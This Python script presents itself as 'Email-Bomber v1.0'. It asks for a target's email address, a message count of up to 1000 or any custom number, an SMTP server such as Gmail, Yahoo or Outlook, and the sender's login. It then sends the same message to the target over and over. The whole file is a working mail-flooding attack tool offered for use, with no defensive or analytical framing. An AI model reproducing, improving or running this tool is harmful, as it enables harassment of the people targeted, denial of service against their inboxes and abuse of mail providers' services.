import smtplib
import sys
import time



class bcolors:

    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'



def banner():
    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+]')
    print(bcolors.GREEN +'+[+[+[ made by dhdh2k24 ]+]+]+]')
    time.sleep(2)
    print(bcolors.RED + '''
           \|/
                           `--+--'
                              |
                          ,--'#`--.
                          |#######|
                       _.-'#######`-._
                    ,-'###############`-.
                  ,'#####################`,         .___     .__         .
                 |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
                |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
               |#############################|
               |#############################|              Author: dhdh2k24
               |#############################|
                |###########################|
                 \#########################/
                  `.#####################,'
                    `._###############_,'
                       `--..#####..--'                                 ,-.--.
    *.______________________________________________________________,' (Bomb)
                                                                        `--' ''')

class Email_bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n+[+[+[ initializing program ]+]+]+')
            time.sleep(3)
            self.target = str(input(bcolors.GREEN + 'Enter target\'s email <: '))
            self.mode = int(input(bcolors.GREEN + 'Enter BOMB mode (1,2,3,4)  || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if self.mode > 4 or self.mode < 1:
                print('ERROR: invalid option. goodbye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ setting up the bomb ]+]+]+')
            self.amount = None
            if self.mode == 1:
                self.amount = 1000
            elif self.mode == 2:
                self.amount = 500
            elif self.mode == 3:
                self.amount = 250
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
            print(bcolors.RED + f'\n+[+[+[ you have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))

            if default_port:
                self.port = 587

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: '))
            self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
            self.message = str(input(bcolors.GREEN + 'Enter message <: '))

            self.msg = f'''From: {self.fromAddr}\nTo: {self.target}\nSubject: {self.subject}\n{self.message}
            '''

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR:{e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count += 1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n[+[+[+[ attacking...]+]+]+]')
        for _ in range(self.amount):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n+[+[+[ attack finished ]+]+]+')
        sys.exit(0)

if __name__ == '__main__':
    banner()
    bomb = Email_bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()